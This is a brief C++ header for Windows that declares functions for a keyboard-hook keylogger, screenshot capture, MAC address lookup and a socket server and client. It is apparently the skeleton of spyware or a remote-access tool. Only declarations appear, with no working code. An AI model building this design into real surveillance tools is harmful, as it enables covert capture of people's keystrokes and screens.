#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600
#include <winsock.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <Assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sys/time.h>
#include <fstream>
#include <Iphlpapi.h>
#include <tchar.h>
#include <iostream>

using namespace std;


char* getMAC();
BOOL WINAPI SaveBitmap(WCHAR *wPath);

//KeyLogger
wchar_t VKCodeToUnicode(UINT vkCode);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

//Server
class Server
{
public:
    void StartServer();
    void StopServer();
    unsigned short port;

private:
    void handle();
    SOCKET sock;
    WSAData wData;
};


SOCKET client();
